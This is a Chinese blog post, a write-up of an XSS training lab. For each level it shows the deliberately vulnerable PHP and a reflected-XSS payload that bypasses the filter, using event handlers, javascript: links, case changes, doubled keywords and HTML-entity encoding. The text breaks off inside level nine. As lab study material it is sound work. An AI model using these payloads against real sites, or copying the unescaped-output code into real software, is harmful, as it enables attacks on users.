@@ -1,0 +1,447 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="0x00:第一关12345&lt;?php ini_set(&quot;display_errors&quot;, 0); &#x2F;&#x2F;本次环境不显示报错$str &#x3D; $_GET[&quot;name&quot;]; &#x2F;&#x2F;get传入一个值赋值给$str变量echo &quot;&lt;h2 align&#x3D;center&gt;欢迎用户&quot;.$str.&quot;&lt;&#x2F;h2&gt;&quot;;  &#x2F;&#x2F;打印$str变量的的值?&gt;  这个第一关没有什么过滤，可以吧输入的东西">
+<meta property="og:type" content="article">
+<meta property="og:title" content="xsslab笔记">
+<meta property="og:url" content="http://yoursite.com/2020/06/16/xsslab%E7%AC%94%E8%AE%B0/index.html">
+<meta property="og:site_name" content="bai191">
+<meta property="og:description" content="0x00:第一关12345&lt;?php ini_set(&quot;display_errors&quot;, 0); &#x2F;&#x2F;本次环境不显示报错$str &#x3D; $_GET[&quot;name&quot;]; &#x2F;&#x2F;get传入一个值赋值给$str变量echo &quot;&lt;h2 align&#x3D;center&gt;欢迎用户&quot;.$str.&quot;&lt;&#x2F;h2&gt;&quot;;  &#x2F;&#x2F;打印$str变量的的值?&gt;  这个第一关没有什么过滤，可以吧输入的东西">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://yoursite.com/2020/06/16/xsslab%E7%AC%94%E8%AE%B0/1.png">
+<meta property="og:image" content="http://yoursite.com/2020/06/16/xsslab%E7%AC%94%E8%AE%B0/2.png">
+<meta property="og:image" content="http://yoursite.com/2020/06/16/xsslab%E7%AC%94%E8%AE%B0/3.png">
+<meta property="article:published_time" content="2020-06-16T09:02:15.000Z">
+<meta property="article:modified_time" content="2020-06-16T09:02:15.000Z">
+<meta property="article:author" content="bai191">
+<meta property="article:tag" content="xss">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://yoursite.com/2020/06/16/xsslab%E7%AC%94%E8%AE%B0/1.png">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>xsslab笔记</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+      
+<link rel="stylesheet" href="/css/rtl.css">
+
+    
+    <!-- rss -->
+    
+    
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">主页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">文章</a></li>
+         
+          <li><a href="/categories/">分类</a></li>
+         
+          <li><a href="/tags/">标签</a></li>
+         
+          <li><a href="/tools/">工具</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" href="/2020/06/09/Terminal-PowerShell-linux%E7%BE%8E%E5%8C%96/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2020/06/16/xsslab%E7%AC%94%E8%AE%B0/" target="_blank" rel="noopener"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2020/06/16/xsslab%E7%AC%94%E8%AE%B0/&text=xsslab笔记" target="_blank" rel="noopener"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2020/06/16/xsslab%E7%AC%94%E8%AE%B0/&title=xsslab笔记" target="_blank" rel="noopener"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2020/06/16/xsslab%E7%AC%94%E8%AE%B0/&is_video=false&description=xsslab笔记" target="_blank" rel="noopener"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=xsslab笔记&body=Check out this article: http://yoursite.com/2020/06/16/xsslab%E7%AC%94%E8%AE%B0/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2020/06/16/xsslab%E7%AC%94%E8%AE%B0/&title=xsslab笔记" target="_blank" rel="noopener"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2020/06/16/xsslab%E7%AC%94%E8%AE%B0/&title=xsslab笔记" target="_blank" rel="noopener"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2020/06/16/xsslab%E7%AC%94%E8%AE%B0/&title=xsslab笔记" target="_blank" rel="noopener"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2020/06/16/xsslab%E7%AC%94%E8%AE%B0/&title=xsslab笔记" target="_blank" rel="noopener"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2020/06/16/xsslab%E7%AC%94%E8%AE%B0/&name=xsslab笔记&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=http://yoursite.com/2020/06/16/xsslab%E7%AC%94%E8%AE%B0/&t=xsslab笔记" target="_blank" rel="noopener"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00-第一关"><span class="toc-number">1.</span> <span class="toc-text">0x00:第一关</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-第二关"><span class="toc-number">2.</span> <span class="toc-text">0x01:第二关</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-第三关"><span class="toc-number">3.</span> <span class="toc-text">0x02:第三关</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-第四关"><span class="toc-number">4.</span> <span class="toc-text">0x03:第四关</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-第五关"><span class="toc-number">5.</span> <span class="toc-text">0x04:第五关</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-第六关"><span class="toc-number">6.</span> <span class="toc-text">0x05:第六关</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x06-第七关"><span class="toc-number">7.</span> <span class="toc-text">0x06:第七关</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x07-第八关"><span class="toc-number">8.</span> <span class="toc-text">0x07:第八关</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x08-第九关"><span class="toc-number">9.</span> <span class="toc-text">0x08:第九关</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x09-第十关"><span class="toc-number">10.</span> <span class="toc-text">0x09:第十关</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x10-第十一关"><span class="toc-number">11.</span> <span class="toc-text">0x10:第十一关</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x11-第十二关"><span class="toc-number">12.</span> <span class="toc-text">0x11:第十二关</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x12-第十三关"><span class="toc-number">13.</span> <span class="toc-text">0x12:第十三关</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x13-第十四关"><span class="toc-number">14.</span> <span class="toc-text">0x13::第十四关</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x14-第十五关"><span class="toc-number">15.</span> <span class="toc-text">0x14:第十五关</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#定义和用法"><span class="toc-number">16.</span> <span class="toc-text">定义和用法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x15-第十六关"><span class="toc-number">17.</span> <span class="toc-text">0x15:第十六关</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x16-第十七关"><span class="toc-number">18.</span> <span class="toc-text">0x16:第十七关</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x17-第十八关"><span class="toc-number">19.</span> <span class="toc-text">0x17:第十八关</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x18-第十九关"><span class="toc-number">20.</span> <span class="toc-text">0x18:第十九关</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x19-第二十关"><span class="toc-number">21.</span> <span class="toc-text">0x19:第二十关</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x20-总结和参考"><span class="toc-number">22.</span> <span class="toc-text">0x20:总结和参考</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#总结"><span class="toc-number">22.1.</span> <span class="toc-text">总结</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#参考"><span class="toc-number">22.2.</span> <span class="toc-text">参考</span></a></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        xsslab笔记
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">bai191</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2020-06-16T09:02:15.000Z" itemprop="datePublished">2020-06-16</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/web/">web</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link" href="/tags/xss/" rel="tag">xss</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h2 id="0x00-第一关"><a href="#0x00-第一关" class="headerlink" title="0x00:第一关"></a>0x00:第一关</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>); <span class="comment">//本次环境不显示报错</span></span><br><span class="line">$str = $_GET[<span class="string">"name"</span>]; <span class="comment">//get传入一个值赋值给$str变量</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h2 align=center&gt;欢迎用户"</span>.$str.<span class="string">"&lt;/h2&gt;"</span>;  <span class="comment">//打印$str变量的的值</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>这个第一关没有什么过滤，可以吧输入的东西直接当成输出，就造成了xss漏洞。</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//payload</span><br><span class="line">?name=<span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="0x01-第二关"><a href="#0x01-第二关" class="headerlink" title="0x01:第二关"></a>0x01:第二关</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = $_GET[<span class="string">"keyword"</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h2 align=center&gt;没有找到和"</span>.htmlspecialchars($str).<span class="string">"相关的结果.&lt;/h2&gt;"</span>.<span class="string">'&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level2.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value="'</span>.$str.<span class="string">'"&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value="搜索"/&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>这里用到了htmlspecialchars函数：</p>
+<img src="/2020/06/16/xsslab%E7%AC%94%E8%AE%B0/1.png" class="" title="图片">
+
+<p>可以这里是吧<strong>&amp; ‘ “ &lt; &gt;</strong>,五个字符替换成html实体，但是发现input标签哪里没有任何的过滤，所以可以从哪里插入。</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//payload</span><br><span class="line">?keyword="&gt;<span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span>	//直接拼接</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="0x02-第三关"><a href="#0x02-第三关" class="headerlink" title="0x02:第三关"></a>0x02:第三关</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = $_GET[<span class="string">"keyword"</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h2 align=center&gt;没有找到和"</span>.htmlspecialchars($str).<span class="string">"相关的结果.&lt;/h2&gt;"</span>.<span class="string">"&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level3.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value='"</span>.htmlspecialchars($str).<span class="string">"'&gt;	</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=搜索 /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>这里可以看到两个点都用了htmlspecialchars函数，过滤了一些特殊的符号，但是可以用js事件来触发。</p>
+<img src="/2020/06/16/xsslab%E7%AC%94%E8%AE%B0/2.png" class="" title="图片">
+
+<p>可以看出这些里面没有哪些特殊符号</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">//payload</span><br><span class="line">?writing=' onclick=alert(1) id='1</span><br><span class="line">?writing=' onmousemove=alert(1) id='1</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="0x03-第四关"><a href="#0x03-第四关" class="headerlink" title="0x03:第四关"></a>0x03:第四关</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = $_GET[<span class="string">"keyword"</span>];</span><br><span class="line">$str2=str_replace(<span class="string">"&gt;"</span>,<span class="string">""</span>,$str);</span><br><span class="line">$str3=str_replace(<span class="string">"&lt;"</span>,<span class="string">""</span>,$str2);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h2 align=center&gt;没有找到和"</span>.htmlspecialchars($str).<span class="string">"相关的结果.&lt;/h2&gt;"</span>.<span class="string">'&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level4.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value="'</span>.$str3.<span class="string">'"&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=搜索 /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>整理看出用了htmlspecialchars函数转义，并且对第二个点用了str_replace函数过滤：</p>
+<img src="/2020/06/16/xsslab%E7%AC%94%E8%AE%B0/3.png" class="" title="图片">
+
+<p>看到这个函数可以区分大小写，我还以为是要大小写绕过，但是想了下&lt;,&gt;这两个没得吧，所以换了个思路，基本上和上题差不多，只是’换成了”。</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">//payload</span><br><span class="line">?keyword=" onclick=alert(1) id="1</span><br><span class="line">?keyword=" onmousemove=alert(1) id="1</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="0x04-第五关"><a href="#0x04-第五关" class="headerlink" title="0x04:第五关"></a>0x04:第五关</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = strtolower($_GET[<span class="string">"keyword"</span>]);</span><br><span class="line">$str2=str_replace(<span class="string">"&lt;script"</span>,<span class="string">"&lt;scr_ipt"</span>,$str);</span><br><span class="line">$str3=str_replace(<span class="string">"on"</span>,<span class="string">"o_n"</span>,$str2);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h2 align=center&gt;没有找到和"</span>.htmlspecialchars($str).<span class="string">"相关的结果.&lt;/h2&gt;"</span>.<span class="string">'&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level5.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value="'</span>.$str3.<span class="string">'"&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=搜索 /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>这里用了三个函数，strtolower大写变成小写，htmlspecialchars转义，str_replace过滤。前面那个可以防止大小写绕过。但是可以用&lt;a&gt;标签伪协议。</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//payload</span><br><span class="line">?keyword="&gt;<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">javascript:alert(1)</span>&gt;</span>1<span class="tag">&lt;/<span class="name">a</span>&gt;</span>#</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="0x05-第六关"><a href="#0x05-第六关" class="headerlink" title="0x05:第六关"></a>0x05:第六关</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = $_GET[<span class="string">"keyword"</span>];</span><br><span class="line">$str2=str_replace(<span class="string">"&lt;script"</span>,<span class="string">"&lt;scr_ipt"</span>,$str);</span><br><span class="line">$str3=str_replace(<span class="string">"on"</span>,<span class="string">"o_n"</span>,$str2);</span><br><span class="line">$str4=str_replace(<span class="string">"src"</span>,<span class="string">"sr_c"</span>,$str3);</span><br><span class="line">$str5=str_replace(<span class="string">"data"</span>,<span class="string">"da_ta"</span>,$str4);</span><br><span class="line">$str6=str_replace(<span class="string">"href"</span>,<span class="string">"hr_ef"</span>,$str5);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h2 align=center&gt;没有找到和"</span>.htmlspecialchars($str).<span class="string">"相关的结果.&lt;/h2&gt;"</span>.<span class="string">'&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level6.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value="'</span>.$str6.<span class="string">'"&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=搜索 /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>这里用了过滤和转义，但是没有大小写转换，所以把前面的任意大小写转换下就行。</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//payload</span><br><span class="line">?keyword=" ONCLICK=alert(1) id="1</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x06-第七关"><a href="#0x06-第七关" class="headerlink" title="0x06:第七关"></a>0x06:第七关</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str =strtolower( $_GET[<span class="string">"keyword"</span>]);</span><br><span class="line">$str2=str_replace(<span class="string">"script"</span>,<span class="string">""</span>,$str);</span><br><span class="line">$str3=str_replace(<span class="string">"on"</span>,<span class="string">""</span>,$str2);</span><br><span class="line">$str4=str_replace(<span class="string">"src"</span>,<span class="string">""</span>,$str3);</span><br><span class="line">$str5=str_replace(<span class="string">"data"</span>,<span class="string">""</span>,$str4);</span><br><span class="line">$str6=str_replace(<span class="string">"href"</span>,<span class="string">""</span>,$str5);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h2 align=center&gt;没有找到和"</span>.htmlspecialchars($str).<span class="string">"相关的结果.&lt;/h2&gt;"</span>.<span class="string">'&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level7.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value="'</span>.$str6.<span class="string">'"&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=搜索 /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>这里有转换大小写，转义，还有过滤。但是过滤是吧特定的字符转换为空，那就可以双写绕过。</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//payload</span><br><span class="line">?keyword=" oonnclick=alert(1) id="1</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x07-第八关"><a href="#0x07-第八关" class="headerlink" title="0x07:第八关"></a>0x07:第八关</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = strtolower($_GET[<span class="string">"keyword"</span>]);</span><br><span class="line">$str2=str_replace(<span class="string">"script"</span>,<span class="string">"scr_ipt"</span>,$str);</span><br><span class="line">$str3=str_replace(<span class="string">"on"</span>,<span class="string">"o_n"</span>,$str2);</span><br><span class="line">$str4=str_replace(<span class="string">"src"</span>,<span class="string">"sr_c"</span>,$str3);</span><br><span class="line">$str5=str_replace(<span class="string">"data"</span>,<span class="string">"da_ta"</span>,$str4);</span><br><span class="line">$str6=str_replace(<span class="string">"href"</span>,<span class="string">"hr_ef"</span>,$str5);</span><br><span class="line">$str7=str_replace(<span class="string">'"'</span>,<span class="string">'&amp;quot'</span>,$str6);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level8.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value="'</span>.htmlspecialchars($str).<span class="string">'"&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=添加友情链接 /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> <span class="keyword">echo</span> <span class="string">'&lt;center&gt;&lt;BR&gt;&lt;a href="'</span>.$str7.<span class="string">'"&gt;友情链接&lt;/a&gt;&lt;/center&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>基本上过滤了我现在所知的方法，但是可以通过编码绕过。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;payload 全部编码</span><br><span class="line">&amp;#x006a;&amp;#x0061;&amp;#x0076;&amp;#x0061;&amp;#x0073;&amp;#x0063;&amp;#x0072;&amp;#x0069;&amp;#x0070;&amp;#x0074;&amp;#x003a;&amp;#x0061;&amp;#x006c;&amp;#x0065;&amp;#x0072;&amp;#x0074;&amp;#x0028;&amp;#x0031;&amp;#x0029;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="0x08-第九关"><a href="#0x08-第九关" class="headerlink" title="0x08:第九关"></a>0x08:第九关</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = strtolower($_GET[<span class="string">"keyword"</span>]);</span><br><span class="line">$str2=str_replace(<span class="string">"script"</span>,<span class="string">"scr_ipt"</span>,$str);</span><br><span class="line">$str3=str_replace(<span class="string">"on"</span>,<span 